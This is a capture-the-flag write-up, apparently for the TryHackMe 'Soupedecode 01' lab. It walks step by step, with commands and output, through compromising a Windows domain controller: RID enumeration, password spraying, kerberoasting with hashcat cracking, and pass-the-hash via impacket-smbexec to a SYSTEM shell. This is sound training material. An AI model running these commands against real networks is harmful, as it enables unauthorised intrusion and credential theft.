---
layout: post
title:  "Soupedecode 01 (THM)"
date:   2025-09-24 17:33:43 -0400
author: robo.uzi
tags: [CTF, TryHackMe]
---

**Description:** Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.
## Initial Access

`nmap -p- -Pn -T5 -vv 10.10.73.251 -oN soupedecodefullnmap.txt`

```shell
nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49667,49675,49717,49791 -T4 -vv 10.10.73.251 -oN soupedecodenmap.txt
```

```shell
PORT      STATE SERVICE       REASON  VERSION  
53/tcp    open  domain        syn-ack Simple DNS Plus  
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-09-22 22:04:29Z)  
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC  
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn  
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds? syn-ack  
464/tcp   open  kpasswd5?     syn-ack  
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped    syn-ack  
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped    syn-ack  
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services  
| rdp-ntlm-info:    
|   Target_Name: SOUPEDECODE  
|   NetBIOS_Domain_Name: SOUPEDECODE  
|   NetBIOS_Computer_Name: DC01  
|   DNS_Domain_Name: SOUPEDECODE.LOCAL  
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL  
|   Product_Version: 10.0.20348  
|_  System_Time: 2025-09-22T22:05:21+00:00  
|_ssl-date: 2025-09-22T22:06:00+00:00; -2s from scanner time.  
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL  
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2025-06-17T21:35:42  
| Not valid after:  2025-12-17T21:35:42  
| MD5:   8660:d3bc:0e75:671b:8ffd:9a7e:fafb:60b5  
| SHA-1: 4349:710e:63b9:e96c:4a8a:c557:c8c4:d217:482f:3673  
| -----BEGIN CERTIFICATE-----  
| MIIC8DCCAdigAwIBAgIQbquejXfqJohC9UQLVBR+cTANBgkqhkiG9w0BAQsFADAh  
| MR8wHQYDVQQDExZEQzAxLlNPVVBFREVDT0RFLkxPQ0FMMB4XDTI1MDYxNzIxMzU0  
| MloXDTI1MTIxNzIxMzU0MlowITEfMB0GA1UEAxMWREMwMS5TT1VQRURFQ09ERS5M  
| T0NBTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALRjne/Ks+HtZcXt  
| BKKUbbTDbTX3AFH72vg8qzFVfmpzCuY6E+nBFUSb7yiQmziAIEWziiRzxh8I6FJ0  
| tP3WMdPv1aATe4tAqw9BmlZZu+vcNAMv2ERBAIrWU51dYGBXIuIv/RORbRpvlhdZ  
| 9KANtId+bAzFxO/1cl3jrMX512gn1uzz8OrZWH+Bjps6OaZ9qTpu/VWmJTkQIJgM  
| LlvMEczaoGzudpCl6i5F3cnGRVU9Lk+sdapL2ILgaZ49EipSj64iUZBi63LyqTJV  
| WS81kKzlwg1MS32jFtBRn2e8WPR1NCrB2d6OHGJyCfAlI9C0ViauKHiv6rEMm8tv  
| M2pIrNUCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw  
| MA0GCSqGSIb3DQEBCwUAA4IBAQAnVIHgBDAr9dDRiG4z8D4k2cF+YprxBcWpuvJc  
| UvLNF71bezDuD0NwQxJcLV4ocnI/xCakLzG/VUNatbb3QAY0Bv6G3Rpi9Qytrafe  
| rED0pe9DsYadx07ci9/FFCI3dq9AhNqLhk+0Z4xOobvhJFkyX1KxGUBp0qnxhw6t  
| a0yNa8q4QX1DMNBa3L61VwFEKdHEho02YJ1rH3r/GUXNGhr9dWO5iMOrXmqtucQv  
| x0M7qS02MAv3FEEHUk8gb+MlbQHNZmTpuLTJCThgBy1gxxEJ6ovTar8W/topGCKS  
| 3JApQpPFWqxW+yWoahcYkGr9q1SKRX1GIq2mXN3NY8A9Rg36  
|_-----END CERTIFICATE-----  
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing  
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49675/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0  
49717/tcp open  msrpc         syn-ack Microsoft Windows RPC  
49791/tcp open  msrpc         syn-ack Microsoft Windows RPC  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2025-09-22T22:05:22  
|_  start_date: N/A  
| p2p-conficker:    
|   Checking for Conficker.C or higher...  
|   Check 1 (port 43150/tcp): CLEAN (Timeout)  
|   Check 2 (port 57416/tcp): CLEAN (Timeout)  
|   Check 3 (port 26156/udp): CLEAN (Timeout)  
|   Check 4 (port 35724/udp): CLEAN (Timeout)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
| smb2-security-mode:    
|   3:1:1:    
|_    Message signing enabled and required  
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
```

Add `dc01.soupedecode.local` and `soupedecode.local` to `/etc/hosts`.

I run `netexec` to look at the `smb` shares:
```shell
nxc smb soupedecode.local -u guest -p '' --shares  
SMB      10.10.120.64    445    DC01      [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)  
SMB      10.10.120.64    445    DC01      [+] SOUPEDECODE.LOCAL\guest:    
SMB      10.10.120.64    445    DC01      [*] Enumerated shares  
SMB      10.10.120.64    445    DC01      Share     Permissions    Remark  
SMB      10.10.120.64    445    DC01      -----     -----------    ------  
SMB      10.10.120.64    445    DC01      ADMIN$    Remote         Admin  
SMB      10.10.120.64    445    DC01      backup                             
SMB      10.10.120.64    445    DC01      C$                       Default share
SMB      10.10.120.64    445    DC01      IPC$      READ           Remote IPC  
SMB      10.10.120.64    445    DC01      NETLOGON            Logon server share 
SMB      10.10.120.64    445    DC01      SYSVOL              Logon server share 
SMB      10.10.120.64    445    DC01      Users
```

Looks like `IPC$` is readable. Since it's readable I try an `RID` brute force. An RID is the trailing number in a Windows SID (Security Identifier) that uniquely identifies an account inside a domain.

The output is very long. I see about 1000 different users and 90 computers in the domain.
```shell
nxc smb soupedecode.local -u guest -p '' --rid  
SMB     10.10.120.64    445    DC01     1626: SOUPEDECODE\qleo530 (SidTypeUser) 
SMB     10.10.120.64    445    DC01     1627: SOUPEDECODE\ljudy531 (SidTypeUser)
```

I run this command to get all users into a txt file: 
```shell
nxc smb soupedecode.local -u guest -p '' --rid | grep "SidTypeUser" | grep -v '\$' | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt

cat users.txt | wc -l  
968
```

Now I'll try to enumerate SMB shares with the list of usernames I found. I'll first try using the username and password combo as the same:
```shell
nxc smb soupedecode.local -u users.txt -p users.txt --no-brute
SMB   10.10.120.64  445  DC01   [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE    
SMB   10.10.120.64  445  DC01   [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE    
SMB   10.10.120.64  445  DC01   [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE    
SMB   10.10.120.64  445  DC01   [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE    
SMB   10.10.120.64  445  DC01   [+] SOUPEDECODE.LOCAL\ybob317:redacted
```

List the shares for this user:
```shell
nxc smb soupedecode.local -u ybob317 -p redacted --shares  
SMB      10.10.120.64    445    DC01    [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)  
SMB      10.10.120.64    445    DC01    [+] SOUPEDECODE.LOCAL\ybob317:redacted   
SMB      10.10.120.64    445    DC01    [*] Enumerated shares  
SMB      10.10.120.64    445    DC01    Share    Permissions  Remark  
SMB      10.10.120.64    445    DC01    -----    -----------  ------  
SMB      10.10.120.64    445    DC01    ADMIN$                Remote Admin 
SMB      10.10.120.64    445    DC01    backup                             
SMB      10.10.120.64    445    DC01    C$                    Default share
SMB      10.10.120.64    445    DC01    IPC$      READ        Remote IPC  
SMB      10.10.120.64    445    DC01    NETLOGON  READ        Logon server share
SMB      10.10.120.64    445    DC01    SYSVOL    READ        Logon server share SMB      10.10.120.64    445    DC01    Users     READ
```

I connect as this user and get `user.txt`:
```shell
smbclient //soupedecode.local/Users -U ybob317  
Password for [WORKGROUP\ybob317]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                  DR        0  Thu Jul  4 18:48:22 2024  
 ..                                DHS        0  Wed Jun 18 18:14:47 2025  
 admin                               D        0  Thu Jul  4 18:49:01 2024  
 Administrator                       D        0  Tue Sep 23 10:00:31 2025  
 All Users                       DHSrn        0  Sat May  8 04:26:16 2021  
 Default                           DHR        0  Sat Jun 15 22:51:08 2024  
 Default User                    DHSrn        0  Sat May  8 04:26:16 2021  
 desktop.ini                       AHS      174  Sat May  8 04:14:03 2021  
 Public                             DR        0  Sat Jun 15 13:54:32 2024  
 ybob317                             D        0  Mon Jun 17 13:24:32 2024  
  
               12942591 blocks of size 4096. 10724597 blocks available  
smb: \> cd ybob317  
smb: \ybob317\> cd Desktop  
smb: \ybob317\Desktop\> ls  
 .                                  DR        0  Fri Jul 25 13:51:44 2025  
 ..                                  D        0  Mon Jun 17 13:24:32 2024  
 desktop.ini                       AHS      282  Mon Jun 17 13:24:32 2024  
 user.txt                            A       33  Fri Jul 25 13:51:44 2025  
  
               12942591 blocks of size 4096. 10724597 blocks available  
smb: \ybob317\Desktop\> get user.txt  
getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
smb: \ybob317\Desktop\> exit
```

Now that I have the user flag I start thinking about kerberoasting as the description said. With the valid credentials I can use impackets `impacket-GetUserSPNs`: 
```shell
impacket-GetUserSPNs soupedecode.local/ybob317:redacted -dc-ip 10.10.120.64 -request -output hashes.txt  
Impacket v0.11.0 - Copyright 2023 Fortra  
  
ServicePrincipalName   Name      MemberOf PasswordLastSet  LastLogon Delegation  
--------------------   ----      -------- ---------------  --------- ----------
FTP/FileServer         file_svc           2024-06-17 13:32:23.726085 <never>     
FW/ProxyServer         firewall_svc       2024-06-17 13:28:32.710125 <never>
HTTP/BackupServer      backup_svc         2024-06-17 13:28:49.476511 <never>
HTTP/WebServer         web_svc            2024-06-17 13:29:04.569417 <never>
HTTPS/MonitoringServer monitoring_svc     2024-06-17 13:29:18.511871 <never> 

[-] CCache file is not found. Skipping...
```
I get 5 hashes. 

I try and see which hash is crackable (shortened output):
```shell
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$the_hash:redacted
```

I list SMB shares with these new creds:
```shell
nxc smb soupedecode.local -u 'file_svc' -p 'redacted' --shares  
SMB    10.10.120.64    445    DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)  
SMB    10.10.120.64    445    DC01  [+] SOUPEDECODE.LOCAL\file_svc:redacted 
SMB    10.10.120.64    445    DC01  [*] Enumerated shares  
SMB    10.10.120.64    445    DC01  Share     Permissions   Remark  
SMB    10.10.120.64    445    DC01  -----     -----------   ------  
SMB    10.10.120.64    445    DC01  ADMIN$                  Remote Admin  
SMB    10.10.120.64    445    DC01  backup    READ               
SMB    10.10.120.64    445    DC01  C$                      Default share  
SMB    10.10.120.64    445    DC01  IPC$      READ          Remote IPC  
SMB    10.10.120.64    445    DC01  NETLOGON  READ          Logon server share
SMB    10.10.120.64    445    DC01  SYSVOL    READ          Logon server share
SMB    10.10.120.64    445    DC01            Users
```
Now I have read access on `backup`. 

Login and read the share:
```shell
smbclient //soupedecode.local/backup -U file_svc  
Password for [WORKGROUP\file_svc]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Mon Jun 17 13:41:17 2024  
 ..                                 DR        0  Fri Jul 25 13:51:20 2025  
 backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024  
  
               12942591 blocks of size 4096. 10724337 blocks available  
smb: \> get backup_extract.txt  
getting file \backup_extract.txt of size 892 as backup_extract.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)  
smb: \> exit
```

The file contains some NTLM hashes:
```shell
cat backup_extract.txt  
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:redacted:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:redacted:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:redacted:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:redacted:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:redacted:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:redacted:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:redacted:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:redacted:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:redacted:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:redacted:::
```

I save the users to `new-users.txt` and extract the 4th field with `cut` to get the hashes into a file:
```shell
cut -d: -f4 backup_extract.txt > ntlm-hashes.txt
```

Now try to pass the hashes:
```shell
nxc smb soupedecode.local -u new-users.txt -H ntlm-hashes.txt --no-brute  
SMB   10.10.120.64   445  DC01     [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)  
SMB   10.10.120.64   445  DC01     [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE    
SMB   10.10.120.64   445  DC01     [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE    
SMB   10.10.120.64   445  DC01     [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE    
SMB   10.10.120.64   445  DC01     [+] SOUPEDECODE.LOCAL\FileServer$:redacted (Pwn3d!)
```

Now using `impacket-smbexec` I can pass the hash and execute commands over SMB:
```shell
impacket-smbexec 'FileServer$'@soupedecode.local -hashes ':redacted'  
Impacket v0.11.0 - Copyright 2023 Fortra  
  
[!] Launching semi-interactive shell - Careful what you execute  
C:\Windows\system32>whoami  
nt authority\system  
  
C:\Windows\system32>cd C:\Users\Administrator\Desktop  
[-] You cant CD under SMBEXEC. Use full paths.  
C:\Windows\system32>dir C:\Users\Administrator\Desktop  
Volume in drive C has no label.  
Volume Serial Number is CCB5-C4FB  
  
Directory of C:\Users\Administrator\Desktop  
  
07/25/2025  10:51 AM    <DIR>          .  
09/23/2025  07:00 AM    <DIR>          ..  
06/17/2024  10:41 AM    <DIR>          backup  
07/25/2025  10:51 AM                33 root.txt  
              1 File(s)             33 bytes  
              3 Dir(s)  43,926,138,880 bytes free  
  
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt  
redacted
  
C:\Windows\system32>exit
```
___
